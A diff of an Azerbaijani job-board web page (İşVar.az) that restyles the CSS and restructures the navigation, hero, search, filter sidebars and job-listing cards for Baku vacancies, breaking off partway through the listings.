@@ -3,302 +3,1101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>İşVar.az | Bakı üzrə Vakansiyalar</title>
+    <title>İşVar.az — Azərbaycanda ən yaxşı vakansiyalar</title>
+    <meta name="description" content="Bakı və Azərbaycanda minlərlə vakansiya. Sürücü, satıcı, ofis, tikinti və digər sahələrdə iş elanları.">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #2563eb;
+            --primary: #0a66c2;
+            --primary-dark: #004182;
+            --primary-light: #e7f3ff;
             --success: #10b981;
-            --bg: #f3f4f6;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --bg: #f8fafc;
+            --card: #ffffff;
             --border: #e5e7eb;
             --text: #111827;
             --text-muted: #6b7280;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.04);
+            --shadow: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 12px 24px rgba(0,0,0,0.12);
         }
+
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); line-height: 1.5; }
-        nav { background: white; padding: 0 5%; height: 65px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 1000; }
-        .logo { font-size: 22px; font-weight: 800; color: var(--primary); text-decoration: none; }
-        .btn-post { background: var(--primary); color: white !important; padding: 8px 15px; border-radius: 6px; text-decoration: none; font-size: 14px; }
-        .location-banner { background: #eff6ff; color: #1e40af; padding: 10px 5%; font-size: 13px; text-align: center; border-bottom: 1px solid #dbeafe; }
-        .search-area { background: white; padding: 25px 5%; border-bottom: 1px solid var(--border); }
-        .search-box { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: 2fr 1fr 1fr 100px; gap: 10px; }
-        .search-box input, .search-box select { padding: 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 14px; outline: none; background: #f9fafb; }
-        .btn-search { background: var(--primary); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .container { max-width: 1200px; margin: 20px auto; display: grid; grid-template-columns: 1fr 300px; gap: 20px; padding: 0 15px; }
-        .phone-card { background: white; padding: 20px; border-radius: 12px; border: 1px solid var(--border); height: fit-content; position: sticky; top: 85px; }
-        .phone-card h4 { font-size: 15px; margin-bottom: 8px; }
-        .phone-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 15px; }
-        .phone-card input { width: 100%; padding: 10px; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 10px; outline: none; }
-        .btn-sub { width: 100%; background: var(--success); color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .job-card { background: white; padding: 18px; border-radius: 12px; border: 1px solid var(--border); margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; transition: 0.2s; }
-        .job-card:hover { border-color: var(--primary); box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        .job-left { display: flex; gap: 15px; align-items: center; }
-        .job-icon { width: 48px; height: 48px; background: #f3f4f6; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: 800; color: #4b5563; font-size: 15px; flex-shrink: 0; }
-        .job-title { font-size: 16px; font-weight: 700; margin-bottom: 2px; }
-        .job-comp { font-size: 13px; color: var(--text-muted); margin-bottom: 3px; }
-        .job-loc { font-size: 12px; color: var(--primary); font-weight: 600; }
-        .job-right { text-align: right; }
-        .job-salary { font-size: 16px; font-weight: 800; color: var(--success); }
-        .btn-apply { margin-top: 8px; padding: 8px 14px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; }
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 2000; }
-        .modal-content { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 420px; position: relative; animation: slideIn 0.3s ease-out; }
-        @keyframes slideIn { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .close-modal { position: absolute; top: 15px; right: 15px; font-size: 22px; cursor: pointer; color: var(--text-muted); }
-        .modal-content h3 { font-size: 18px; margin-bottom: 20px; line-height: 1.4; }
-        .modal-content input { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; outline: none; }
-        .btn-send { width: 100%; background: var(--success); color: white; border: none; padding: 13px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 10px auto; }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ==================== NAV ==================== */
+        nav {
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 0 5%;
+            height: 70px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .nav-left { display: flex; align-items: center; gap: 40px; }
+        .logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--primary);
+            text-decoration: none;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .logo i { font-size: 26px; }
+        .nav-links { display: flex; gap: 28px; }
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        .nav-links a:hover { color: var(--primary); }
+        .nav-right { display: flex; align-items: center; gap: 12px; }
+        .btn-post {
+            background: var(--primary);
+            color: white !important;
+            padding: 10px 20px;
+            border-radius: 24px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            transition: 0.2s;
+            border: none;
+            cursor: pointer;
+        }
+        .btn-post:hover { background: var(--primary-dark); transform: translateY(-1px); }
+
+        /* ==================== HERO ==================== */
+        .hero {
+            background: linear-gradient(135deg, #0a66c2 0%, #004182 100%);
+            color: white;
+            padding: 80px 5% 100px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+        .hero h1 {
+            font-size: 44px;
+            font-weight: 900;
+            margin-bottom: 16px;
+            letter-spacing: -1px;
+            position: relative;
+            z-index: 1;
+        }
+        .hero p {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 40px;
+            position: relative;
+            z-index: 1;
+        }
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 60px;
+            margin-top: 40px;
+            position: relative;
+            z-index: 1;
+        }
+        .hero-stat {
+            text-align: center;
+        }
+        .hero-stat-num {
+            font-size: 32px;
+            font-weight: 900;
+            margin-bottom: 4px;
+        }
+        .hero-stat-label {
+            font-size: 13px;
+            opacity: 0.8;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ==================== SEARCH ==================== */
+        .search-wrapper {
+            max-width: 900px;
+            margin: -40px auto 0;
+            padding: 0 5%;
+            position: relative;
+            z-index: 10;
+        }
+        .search-box {
+            background: white;
+            border-radius: 16px;
+            box-shadow: var(--shadow-lg);
+            padding: 12px;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr auto;
+            gap: 8px;
+            align-items: center;
+        }
+        .search-input, .search-select {
+            padding: 14px 16px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            background: #f9fafb;
+            transition: 0.2s;
+            color: var(--text);
+        }
+        .search-input:focus, .search-select:focus {
+            border-color: var(--primary);
+            background: white;
+            box-shadow: 0 0 0 3px var(--primary-light);
+        }
+        .btn-search {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 14px 28px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            white-space: nowrap;
+        }
+        .btn-search:hover { background: var(--primary-dark); }
+
+        /* ==================== CONTAINER ==================== */
+        .container {
+            max-width: 1280px;
+            margin: 40px auto;
+            display: grid;
+            grid-template-columns: 260px 1fr 280px;
+            gap: 24px;
+            padding: 0 5%;
+        }
+
+        /* ==================== SIDEBAR ==================== */
+        .sidebar-card {
+            background: white;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+        .sidebar-card h4 {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .filter-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+            font-size: 14px;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+        .filter-item input { cursor: pointer; accent-color: var(--primary); }
+        .filter-item:hover { color: var(--primary); }
+
+        .subscribe-card {
+            background: linear-gradient(135deg, #0a66c2 0%, #004182 100%);
+            color: white;
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+        }
+        .subscribe-card h4 {
+            color: white;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .subscribe-card p {
+            font-size: 13px;
+            opacity: 0.9;
+            margin-bottom: 16px;
+        }
+        .subscribe-card input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            font-size: 13px;
+            outline: none;
+        }
+        .subscribe-card button {
+            width: 100%;
+            background: white;
+            color: var(--primary);
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        /* ==================== JOB LIST ==================== */
+        .job-list-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .job-list-header h2 {
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        .job-list-header span {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .job-card {
+            background: white;
+            border-radius: 14px;
+            border: 1px solid var(--border);
+            padding: 20px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+        .job-card:hover {
+            border-color: var(--primary);
+            box-shadow: var(--shadow);
+            transform: translateY(-2px);
+        }
+        .job-left { display: flex; gap: 16px; align-items: center; flex: 1; }
+        .job-icon {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, var(--primary-light) 0%, #dbeafe 100%);
+            color: var(--primary);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 16px;
+            flex-shrink: 0;
+            letter-spacing: -0.5px;
+        }
+        .job-info { flex: 1; }
+        .job-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            color: var(--text);
+        }
+        .job-comp {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+        .job-meta {
+            display: flex;
+            gap: 14px;
+            font-size: 12px;
+            color: var(--text-muted);
+            align-items: center;
+        }
+        .job-meta span { display: flex; align-items: center; gap: 4px; }
+        .job-meta i { color: var(--primary); }
+
+        .job-right { text-align: right; display: flex; flex-direction: column; align-items: flex-end; gap: 8px; }
+        .job-salary {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--success);
+            white-space: nowrap;
+        }
+        .job-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            background: #fef3c7;
+            color: #92400e;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        .job-badge.new { background: #dbeafe; color: #1e40af; }
+        .job-badge.urgent { background: #fee2e2; color: #991b1b; }
+
+        .btn-apply {
+            padding: 8px 18px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+        .btn-apply:hover { background: var(--primary-dark); }
+
+        /* ==================== MODAL ==================== */
+        .modal-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(4px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            padding: 20px;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-content {
+            background: white;
+            padding: 36px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 440px;
+            position: relative;
+            animation: slideIn 0.3s ease-out;
+            box-shadow: var(--shadow-lg);
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .close-modal {
+            position: absolute;
+            top: 18px; right: 18px;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text-muted);
+            background: none;
+            border: none;
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            transition: 0.2s;
+        }
+        .close-modal:hover { background: var(--bg); color: var(--text); }
+        .modal-content h3 {
+            font-size: 20px;
+            margin-bottom: 8px;
+            line-height: 1.3;
+            font-weight: 800;
+        }
+        .modal-content .modal-sub {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 24px;
+        }
+        .form-group { margin-bottom: 14px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text);
+        }
+        .form-group input {
+            width: 100%;
+            padding: 13px 16px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            transition: 0.2s;
+        }
+        .form-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px var(--primary-light);
+        }
+        .btn-send {
+            width: 100%;
+            background: var(--success);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 15px;
+            margin-top: 8px;
+            transition: 0.2s;
+        }
+        .btn-send:hover { background: #059669; }
+        .loader {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ==================== FOOTER ==================== */
+        footer {
+            background: white;
+            border-top: 1px solid var(--border);
+            padding: 50px 5% 30px;
+            margin-top: 60px;
+        }
+        .footer-grid {
+            max-width: 1280px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr;
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        .footer-col h5 {
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .footer-col p, .footer-col a {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-decoration: none;
+            line-height: 2;
+            display: block;
+            transition: 0.2s;
+        }
+        .footer-col a:hover { color: var(--primary); }
+        .footer-bottom {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid var(--border);
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        /* ==================== RESPONSIVE ==================== */
+        @media (max-width: 1100px) {
+            .container { grid-template-columns: 1fr 280px; }
+            .sidebar-left { display: none; }
+        }
         @media (max-width: 850px) {
             .container { grid-template-columns: 1fr; }
+            .sidebar-right { display: none; }
             .search-box { grid-template-columns: 1fr; }
-            .job-card { flex-direction: column; align-items: flex-start; gap: 12px; }
-            .job-right { width: 100%; text-align: left; border-top: 1px solid #f1f5f9; padding-top: 10px; display: flex; justify-content: space-between; align-items: center; }
-            .btn-apply { margin-top: 0; }
+            .hero h1 { font-size: 32px; }
+            .hero p { font-size: 16px; }
+            .hero-stats { gap: 30px; flex-wrap: wrap; }
+            .hero-stat-num { font-size: 24px; }
+            .nav-links { display: none; }
+            .footer-grid { grid-template-columns: 1fr 1fr; }
+            .job-card { flex-direction: column; align-items: flex-start; gap: 14px; }
+            .job-right { width: 100%; flex-direction: row; justify-content: space-between; align-items: center; }
+        }
+        @media (max-width: 500px) {
+            .hero { padding: 50px 5% 70px; }
+            .hero h1 { font-size: 26px; }
+            .footer-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
 
+<!-- ==================== NAV ==================== -->
 <nav>
-    <a href="#" class="logo">İşVar.az</a>
-    <a href="#" class="btn-post">Elan yerləşdir +</a>
+    <div class="nav-left">
+        <a href="#" class="logo">
+            <i class="fas fa-briefcase"></i>
+            İşVar.az
+        </a>
+        <div class="nav-links">
+            <a href="#">Vakansiyalar</a>
+            <a href="#">Şirkətlər</a>
+            <a href="#">Maaşlar</a>
+            <a href="#">Karyera</a>
+        </div>
+    </div>
+    <div class="nav-right">
+        <a href="#" class="btn-post">
+            <i class="fas fa-plus"></i> Elan yerləşdir
+        </a>
+    </div>
 </nav>
 
-<div class="location-banner" id="loc-banner">
-    <i class="fas fa-spinner fa-spin"></i> Bakı üzrə ən yaxın vakansiyalar filtr edilir...
-</div>
+<!-- ==================== HERO ==================== -->
+<section class="hero">
+    <h1>Azərbaycanda ən yaxşı işlər</h1>
+    <p>Minlərlə vakansiya — bir yerdə. Karyeranı bu gün başla.</p>
+    <div class="hero-stats">
+        <div class="hero-stat">
+            <div class="hero-stat-num">5,240+</div>
+            <div class="hero-stat-label">Aktiv vakansiya</div>
+        </div>
+        <div class="hero-stat">
+            <div class="hero-stat-num">1,180+</div>
+            <div class="hero-stat-label">Şirkət</div>
+        </div>
+        <div class="hero-stat">
+            <div class="hero-stat-num">48,000+</div>
+            <div class="hero-stat-label">İstifadəçi</div>
+        </div>
+    </div>
+</section>
 
-<div class="search-area">
+<!-- ==================== SEARCH ==================== -->
+<div class="search-wrapper">
     <div class="search-box">
-        <input type="text" placeholder="İş axtar (məs: Sürücü, Satıcı)">
-        <select id="reg-select">
-            <option>Bakı</option><option>Sumqayıt</option><option>Xırdalan</option><option>Nəsimi</option><option>Xətai</option><option>Gəncə</option><option>Mingəçevir</option>
+        <input type="text" class="search-input" placeholder="Vəzifə, şirkət və ya açar söz">
+        <select class="search-select">
+            <option>Bütün şəhərlər</option>
+            <option selected>Bakı</option>
+            <option>Sumqayıt</option>
+            <option>Gəncə</option>
+            <option>Mingəçevir</option>
+            <option>Xırdalan</option>
         </select>
-        <select>
-            <option>Bütün işlər</option>
-            <optgroup label="Xidmət sahələri">
-                <option>Təhsil</option><option>Səhiyyə</option><option>Turizm</option>
-            </optgroup>
-            <optgroup label="Ticarət və İstehsalat">
-                <option>Ticarət</option><option>İstehsalat</option><option>Kənd təsərrüfatı</option>
-            </optgroup>
+        <select class="search-select">
+            <option>Bütün sahələr</option>
             <option>Nəqliyyat</option>
+            <option>Ticarət</option>
+            <option>Xidmət</option>
+            <option>Tikinti</option>
+            <option>Ofis</option>
         </select>
-        <button class="btn-search">Axtar</button>
+        <button class="btn-search">
+            <i class="fas fa-search"></i> Axtar
+        </button>
     </div>
 </div>
 
+<!-- ==================== CONTAINER ==================== -->
 <div class="container">
+
+    <!-- SOL SIDEBAR -->
+    <aside class="sidebar-left">
+        <div class="sidebar-card">
+            <h4><i class="fas fa-filter"></i> Filtr</h4>
+            <label class="filter-item"><input type="checkbox"> Tam iş günü</label>
+            <label class="filter-item"><input type="checkbox"> Yarım iş günü</label>
+            <label class="filter-item"><input type="checkbox"> Uzaqdan</label>
+            <label class="filter-item"><input type="checkbox"> Təcrübəsiz</label>
+        </div>
+        <div class="sidebar-card">
+            <h4><i class="fas fa-money-bill-wave"></i> Maaş (AZN)</h4>
+            <label class="filter-item"><input type="checkbox"> 500-700</label>
+            <label class="filter-item"><input type="checkbox"> 700-1000</label>
+            <label class="filter-item"><input type="checkbox"> 1000-1500</label>
+            <label class="filter-item"><input type="checkbox"> 1500+</label>
+        </div>
+        <div class="sidebar-card">
+            <h4><i class="fas fa-clock"></i> İş rejimi</h4>
+            <label class="filter-item"><input type="checkbox"> Gündüz</label>
+            <label class="filter-item"><input type="checkbox"> Axşam</label>
+            <label class="filter-item"><input type="checkbox"> Növbəli</label>
+        </div>
+    </aside>
+
+    <!-- ƏSAS MƏZMUN -->
     <main>
-        <h3 style="margin-bottom: 15px; font-size: 18px;">Yeni İş Elanları (Bakı)</h3>
+        <div class="job-list-header">
+            <h2>Yeni vakansiyalar</h2>
+            <span>20 elan</span>
+        </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">BRV</div>
-                <div><div class="job-title">Satıcı-Kassir</div><div class="job-comp">Bravo Supermarket</div><div class="job-loc">Bakı, Nərimanov r.</div></div>
+                <div class="job-info">
+                    <div class="job-title">Satıcı-Kassir</div>
+                    <div class="job-comp">Bravo Supermarket</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Nərimanov</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">550 - 650 AZN</div><button class="btn-apply" onclick="openApplyModal('Bravo - Kassir')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">550 - 650 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Bravo - Satıcı-Kassir')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">WLT</div>
-                <div><div class="job-title">Kuryer (Mopedlə)</div><div class="job-comp">Wolt Azərbaycan</div><div class="job-loc">Bakı (Mərkəz ərazilər)</div></div>
+                <div class="job-info">
+                    <div class="job-title">Kuryer (Mopedlə)</div>
+                    <div class="job-comp">Wolt Azərbaycan</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Mərkəz</span>
+                        <span><i class="fas fa-clock"></i> Çevik</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">800 - 1500 AZN</div><button class="btn-apply" onclick="openApplyModal('Wolt - Kuryer')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-badge new">YENİ</div>
+                <div class="job-salary">800 - 1500 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Wolt - Kuryer')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">166</div>
-                <div><div class="job-title">Yükdaşıma Sürücüsü</div><div class="job-comp">166 Yükdaşıma Xidməti</div><div class="job-loc">Bakı / Abşeron</div></div>
+                <div class="job-info">
+                    <div class="job-title">Yükdaşıma Sürücüsü</div>
+                    <div class="job-comp">166 Yükdaşıma Xidməti</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Bakı / Abşeron</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">700 - 1000 AZN</div><button class="btn-apply" onclick="openApplyModal('166 - Sürücü')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">700 - 1000 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('166 - Sürücü')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">SEC</div>
-                <div><div class="job-title">Mühafizəçi</div><div class="job-comp">G-S Mühafizə Şirkəti</div><div class="job-loc">Bakı, 28 May m/s yaxınlığı</div></div>
+                <div class="job-info">
+                    <div class="job-title">Mühafizəçi</div>
+                    <div class="job-comp">G-S Mühafizə Şirkəti</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> 28 May m/s</span>
+                        <span><i class="fas fa-clock"></i> Növbəli</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">500 - 600 AZN</div><button class="btn-apply" onclick="openApplyModal('Mühafizəçi')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">500 - 600 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Mühafizəçi')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">OBA</div>
-                <div><div class="job-title">Mağaza İşçisi (Kassir)</div><div class="job-comp">OBA Marketlər Şəbəkəsi</div><div class="job-loc">Bakı, Yasamal r.</div></div>
+                <div class="job-info">
+                    <div class="job-title">Mağaza İşçisi (Kassir)</div>
+                    <div class="job-comp">OBA Marketlər Şəbəkəsi</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Yasamal</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">500 - 550 AZN</div><button class="btn-apply" onclick="openApplyModal('Oba - Satıcı')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">500 - 550 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Oba - Satıcı')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">BOL</div>
-                <div><div class="job-title">Taksi Sürücüsü</div><div class="job-comp">Bolt Azerbaijan</div><div class="job-loc">Bakı şəhəri</div></div>
+                <div class="job-info">
+                    <div class="job-title">Taksi Sürücüsü</div>
+                    <div class="job-comp">Bolt Azerbaijan</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Bakı</span>
+                        <span><i class="fas fa-clock"></i> Çevik</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">1000 - 1500 AZN</div><button class="btn-apply" onclick="openApplyModal('Bolt - Sürücü')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-badge urgent">TƏCİLİ</div>
+                <div class="job-salary">1000 - 1500 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Bolt - Sürücü')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">DOM</div>
-                <div><div class="job-title">Moto-Kuryer</div><div class="job-comp">Domino's Pizza</div><div class="job-loc">Bakı, Gənclik filialı</div></div>
+                <div class="job-info">
+                    <div class="job-title">Moto-Kuryer</div>
+                    <div class="job-comp">Domino's Pizza</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Gənclik</span>
+                        <span><i class="fas fa-clock"></i> Çevik</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">600 - 900 AZN</div><button class="btn-apply" onclick="openApplyModal('Dominos - Kuryer')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">600 - 900 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Dominos - Kuryer')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">CLN</div>
-                <div><div class="job-title">Təmizlik İşçisi (Xadimə)</div><div class="job-comp">Bakı Mall</div><div class="job-loc">Bakı, İnşaatçılar m/s</div></div>
+                <div class="job-info">
+                    <div class="job-title">Təmizlik İşçisi (Xadimə)</div>
+                    <div class="job-comp">Bakı Mall</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> İnşaatçılar m/s</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">450 - 550 AZN</div><button class="btn-apply" onclick="openApplyModal('Xadimə')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">450 - 550 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Xadimə')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">SOC</div>
-                <div><div class="job-title">Operator (Yanacaqdoldurma)</div><div class="job-comp">SOCAR Petrol</div><div class="job-loc">Bakı, Heydər Əliyev pr.</div></div>
+                <div class="job-info">
+                    <div class="job-title">Operator (Yanacaqdoldurma)</div>
+                    <div class="job-comp">SOCAR Petrol</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> H. Əliyev pr.</span>
+                        <span><i class="fas fa-clock"></i> Növbəli</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">600 - 700 AZN</div><button class="btn-apply" onclick="openApplyModal('Socar - Operator')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">600 - 700 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Socar - Operator')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">UST</div>
-                <div><div class="job-title">Mebel Ustası (Köməkçi)</div><div class="job-comp">Embawood</div><div class="job-loc">Bakı, Binəqədi</div></div>
+                <div class="job-info">
+                    <div class="job-title">Mebel Ustası (Köməkçi)</div>
+                    <div class="job-comp">Embawood</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Binəqədi</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
